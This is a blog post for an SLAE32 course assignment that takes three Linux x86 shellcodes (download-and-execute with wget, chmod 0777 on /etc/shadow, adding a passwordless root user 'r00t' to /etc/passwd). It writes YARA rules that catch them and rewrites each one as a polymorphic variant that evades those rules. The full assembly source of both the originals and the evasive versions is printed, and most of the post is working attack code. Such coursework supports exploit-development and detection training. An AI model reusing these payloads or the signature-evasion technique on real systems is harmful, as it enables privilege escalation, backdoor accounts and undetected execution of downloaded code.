---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 6 - Polymorph"
date:   2022-10-05 08:45:58 +0200
category: SLAE32
subject: Assignment 6 - Polymorph
excerpt_separator: <!--more-->
github-link: https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment6
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching
- The polymorphic version cannot be larger than 150% of the existing shellcode 
- Bonus points for making it shorter in length than the original

As follows the list of shellcodes that we are going to change into polymorphic ones:
- downloadexec
- chmod 0777 /etc/shadow
- Add r00t user to /etc/passwd
 
<!--more-->

###  <span style="color:#2d8fb3;">  Part 1 - downloadexec </span>

***Link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-862.php***

First we retrieved the shellcode and make it works with the localhost.

<img src="/assets/slae32-img/assignment6/assignment6.9.PNG" alt="drawing" style="width:900px;"/>

The shellcode download a file "x" and execute it which displays an "HelloWorld" as we can see.

We supposed that the yara rule as follows flagged our original shellcode.

    rule download_exec_shell {
	    meta:
		    description = "Personal rule"
	    strings:
		    $y1 = {74 2f 2f 78} 
		    $y2 = {6C 68 6F 73}
		    $y3 = {6C 6f 63 61}
		    $y4 = {2f 77 67 65}
		    $y5 = {2f 62 69 6e}
		    $y6 = {2f 75 73 72}
	    condition:
	    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
    }

The y1 to y3 strings correspond to the instruction for the setting of the "localhost/x":
    
    push 0x782f2f74  ; x//t
    push 0x736F686C  ; sohl
    push 0x61636f6c  ; acol

And the y4 to y6 strings correspond to the instrution for the setting of the "/usr/bin/wget":
    
    push 0x74
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/ 

The Yara rule triggered the detection as follows:

<img src="/assets/slae32-img/assignment6/assignment6.7.PNG" alt="drawing" style="width:900px;"/> 

Then, we modified our strings to bypass the Yara rule.

Modifications to bypass the "localhost/x" condition:

    mov dword [esp-4], 0x782f2f74 ; t//x
    mov dword [esp-8], 0x736F686C ; lhos
    mov esi, 0x50525e5b
    add esi, 0x11111111
    mov dword [esp-12], esi ; loca

Modifications to bypass the "/usr/bin/wget" condition:

    mov byte [esp-1], 0x74
    mov esi, 0x5456661e
    add esi, 0x11111111
    mov dword [esp-5], esi ;egw/
    mov dword [esp-9], 0x6e69622f ;nib/
    mov dword [esp-13], 0x7273752f ;rsu/

As we can see, our modification succeded to bypass the yara rule.

<img src="/assets/slae32-img/assignment6/assignment6.8.PNG" alt="drawing" style="width:900px;"/> 

***Shellcode Length details***
- Length of the original shellcode: 103 bytes
- Length of the modified shellcode: 142 bytes
- Percentage length of the modified shellcode from the original: 137.8%

**Original shellcode:**

    ; INITIAL SHELLCODE
    ; Filename: downloadexec.nasm
    ; Author: Daniel Sauder
    ; Website: http://govolution.wordpress.com/
    ; Tested on: Ubuntu 12.04 / 32Bit
    ; License: http://creativecommons.org/licenses/by-sa/3.0/

    ; Shellcode:
    ; - download 192.168.2.222/x with wget
    ; - chmod x
    ; - execute x
    ; - x is an executable
    ; - length 108 bytes

    global _start

    section .text

    _start:

        ;fork
        xor eax,eax
        mov al,0x2
        int 0x80
        xor ebx,ebx
        cmp eax,ebx
        jz child
  
        ;wait(NULL)
        xor eax,eax
        mov al,0x7
        int 0x80
        
        ;chmod x
        xor ecx,ecx
        xor eax, eax
        push eax
        mov al, 0xf
        push 0x78
        mov ebx, esp
        xor ecx, ecx
        mov cx, 0x1ff
        int 0x80
    
        ;exec x
        xor eax, eax
        push eax
        push 0x78
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
    
    child:
        ;download 192.168.2.222//x with wget
        push 0xb
        pop eax
        cdq
        push edx
    
        push 0x782f2f74  ; x//t
        push 0x736F686C  ; sohl
        push 0x61636f6c  ; acol
        mov ecx,esp
        push edx
    
        push 0x74 ;t
        push 0x6567772f ;egw/
        push 0x6e69622f ;nib/
        push 0x7273752f ;rsu/
        mov ebx,esp
        push edx
        push ecx
        push ebx
        mov ecx,esp
        int 0x80


**Modified shellcode:**

    ; MODIFIED SHELLCODE
    ; Filename: downloadexecpoly.nasm
    ; Author: Jeremy Catelain

    global _start

    section .text

    _start:

        ;fork
        xor eax,eax
        mov al,0x1
        add al, 0x1
        int 0x80
        xor ebx,ebx
        cmp eax,ebx
        jz child
  
        ;wait(NULL)
        xor eax,eax
        mov al,0x7
        int 0x80
        
        ;chmod x
        xor ecx,ecx
        mov eax, ecx
        push eax
        mov al, 0xf
        push 0x78
        mov ebx, esp
        xor ecx, ecx
        mov cx, 0x1ff
        int 0x80
    
        ;exec x
        xor eax, eax
        push eax
        push 0x78
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
    
    child:
        ;download 192.168.2.222//x with wget
        push 0xb
        pop eax
        cdq
        push edx

        mov dword [esp-4], 0x782f2f74 ; t//x
        mov dword [esp-8], 0x736F686C ; lhos
        mov esi, 0x50525e5b
        add esi, 0x11111111
        mov dword [esp-12], esi ; loca

        sub esp, 12

        mov ecx,esp
        push edx
    
        mov byte [esp-1], 0x74
        mov esi, 0x5456661e
        add esi, 0x11111111
        mov dword [esp-5], esi ;egw/
        mov dword [esp-9], 0x6e69622f ;nib/
        mov dword [esp-13], 0x7273752f ;rsu/
        sub esp, 13
        mov ebx,esp
        push edx
        push ecx
        push ebx
        mov ecx,esp
        int 0x80


###  <span style="color:#2d8fb3;">  Part 2 - chmod 0777 /etc/shadow </span>

***link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-875.php***

The aim of this second shellcode is to modify the access rights on the /etc/shadow file. To do so, only the chmod syscall (EAX = 0xf) is performed.

<img src="/assets/slae32-img/assignment6/assignment6.10.PNG" alt="drawing" style="width:900px;"/> 

We supposed that the yara rule as follows flagged our original shellcode.

    rule chmodshadow {
	    meta:
		    description = "Personal rule"
	    strings:
		    $y1 = {2f 2f 73 68}
		    $y2 = {2f 65 74 63}
		    $y3 = {3e 1f 3a 56}
	    condition:
	    $y1 and $y2 and $y3
    }

The y1 to y3 strings correspond to the instruction for the setting of the "/etc/shadow":
    
    mov esi, 0x563a1f3e
    add esi, 0x21354523
    mov dword [esp-4], esi
    mov dword [esp-8], 0x68732f2f
    mov dword [esp-12], 0x6374652f

The Yara rule effectively detected our shellcode:

<img src="/assets/slae32-img/assignment6/assignment6.16.PNG" alt="drawing" style="width:900px;"/> 

Then, we modified our strings to bypass the Yara rule.

Modifications to bypass the ""/etc/shadow"" condition:

    mov esi, 0x6374ef32 
    add esi, 0x13FA752F ;0x776F6461
    mov dword [esp-4], esi
    sub esi, 0xefc3532
    mov dword [esp-8], esi ; 0x68732f2f
    mov dword [esp-12], 0x6374652f

As we can see, our modification succeded to bypass the yara rule.

<img src="/assets/slae32-img/assignment6/assignment6.17.PNG" alt="drawing" style="width:900px;"/> 

***Shellcode Length details***
- Length of the original shellcode: 49 bytes
- Length of the modified shellcode: 52 bytes
- Percentage length of the modified shellcode from the original: 106%


**Original shellcode:**

    ; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
    ; Platform: linux/x86
    ; Date:     2014-06-22
    ; Author:   Osanda Malith Jayathissa (@OsandaMalith)

    section .text
    global _start

    _start: 
    mov ebx, eax
    xor eax, ebx
    push dword eax
    mov esi, 0x563a1f3e
    add esi, 0x21354523
    mov dword [esp-4], esi
    mov dword [esp-8], 0x68732f2f
    mov dword [esp-12], 0x6374652f
    sub esp, 12
    mov    ebx,esp
    push word  0x1ff
    pop    cx
    mov    al,0xf
    int    0x80


**Modified shellcode:**

    ; MODIFIED SHELLCODE
    ; Filename: chmodshadow-poly.nasm
    ; Author: Jeremy Catelain
    ; chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes

    section .text
    global _start

    _start: 
    mov ebx, eax
    xor eax, ebx
    push dword eax
    mov esi, 0x6374ef32 
    add esi, 0x13FA752F ;0x776F6461
    mov dword [esp-4], esi
    sub esi, 0xefc3532
    mov dword [esp-8], esi ; 0x68732f2f
    mov dword [esp-12], 0x6374652f
    sub esp, 12
    mov    ebx,esp
    push word  0x1ff
    pop    cx
    mov    al,0xf
    int    0x80


###  <span style="color:#2d8fb3;">  Part 3 - Add r00t user to /etc/passwd </span>

***link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-211.php***

The aim of this shellcode is to add a r00t user to the /etc/passwd file. 
To do so, the following steps are followed:
- open("/etc//passwd", O_WRONLY  O_APPEND)
- write(ebx, "r00t::0:0:::", 12)
- close(ebx)
- exit()

**Result:**

***Execution of the shellcode:***

<img src="/assets/slae32-img/assignment6/assignment6.12.PNG" alt="drawing" style="width:900px;"/> 

***Content of the /etc/passwd:***

<img src="/assets/slae32-img/assignment6/assignment6.11.PNG" alt="drawing" style="width:900px;"/> 

We supposed that the yara rule as follows flagged our original shellcode.

    rule addr00tuser {
	    meta:
		    description = "Personal rule"
	    strings:
		    $y1 = {73 73 77 64}
		    $y2 = {2f 2f 70 61}
		    $y3 = {2f 65 74 63}
		    $y4 = {30 3a 3a 3a}
		    $y5 = {3a 3a 30 3a}
		    $y6 = {72 30 30 74}
	    condition:
	    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
    }

The y1 to y3 strings correspond to the instruction for the setting of the "/etc//passwd":
    
     push 0x64777373 ; dwss
     push 0x61702f2f ; ap//
     push 0x6374652f ; cte/

And the y4 to y6 strings correspond to the instrution for the setting of the "r00t::0:0:::":
    
     push 0x3a3a3a30 ; :::0
     push 0x3a303a3a ; :0::
     push 0x74303072 ; t00r

The Yara rule effectively detected our shellcode:

<img src="/assets/slae32-img/assignment6/assignment6.15.PNG" alt="drawing" style="width:900px;"/> 

Then, we modified our strings to bypass the Yara rule.

Modifications to bypass the "/etc//passwd" condition:

    mov esi, 0x53666162
    add esi, 0x11111211
    mov dword [esp-4], esi ; dwss
    sub esi, 0x3074444
    mov dword [esp-8], esi ; ap//
    sub esp, 8
    push 0x6374652f

Modifications to bypass the "r00t::0:0:::" condition:

    mov esi, 0x2805e3b8
    add esi, 0x12345678 
    mov dword [esp-4], esi ; :::0
    sub esp, 4
    push 0x3a303a3a ; :0::
    push 0x74303072 ; t00r

As we can see, our modification succeded to bypass the yara rule.

<img src="/assets/slae32-img/assignment6/assignment6.8.PNG" alt="drawing" style="width:900px;"/> 

***Shellcode Length details***
- Length of the original shellcode: 69 bytes
- Length of the modified shellcode: 100 bytes
- Percentage length of the modified shellcode from the original: 144.9%

**Original shellcode:**

    ;By Kris Katterjohn 11/14/2006
    ;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
    ;for Linux/x86

    section .text

          global _start

     _start:

     ; open("/etc//passwd", O_WRONLY | O_APPEND)

          push byte 5
          pop eax
          xor ecx, ecx
          push ecx
          push 0x64777373
          push 0x61702f2f
          push 0x6374652f
          mov ebx, esp
          mov cx, 02001Q
          int 0x80

          mov ebx, eax

     ; write(ebx, "r00t::0:0:::", 12)

          push byte 4
          pop eax
          xor edx, edx
          push edx
          push 0x3a3a3a30 ; :::0
          push 0x3a303a3a ; :0::
          push 0x74303072 ; t00r
          mov ecx, esp
          push byte 12
          pop edx
          int 0x80

     ; close(ebx)

          push byte 6
          pop eax
          int 0x80

     ; exit()

          push byte 1
          pop eax
          int 0x80

**Modified shellcode:**

    ; MODIFIED SHELLCODE
    ; Filename: addr00tuser-poly.nasm
    ; Author: Jeremy Catelain
    ;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
    ;for Linux/x86


    section .text

          global _start

     _start:

     ; open("/etc//passwd", O_WRONLY | O_APPEND)

          push byte 5
          pop eax
          xor ecx, ecx
          push ecx
          mov esi, 0x53666162
          add esi, 0x11111211
          mov dword [esp-4], esi ; dwss
          sub esi, 0x3074444
          mov dword [esp-8], esi ; ap//
          sub esp, 8
          push 0x6374652f
          mov ebx, esp
          mov cx, 02001Q
          int 0x80

          mov ebx, eax

     ; write(ebx, "r00t::0:0:::", 12)

          push byte 4
          pop eax
          xor edx, edx
          push edx
          mov esi, 0x2805e3b8
          add esi, 0x12345678 
          mov dword [esp-4], esi ; :::0
          sub esp, 4
          push 0x3a303a3a ; :0::
          push 0x74303072 ; t00r
          mov ecx, esp
          push byte 12
          pop edx
          int 0x80

     ; close(ebx)

          push byte 6
          pop eax
          int 0x80

     ; exit()

          push byte 1
          pop eax
          int 0x80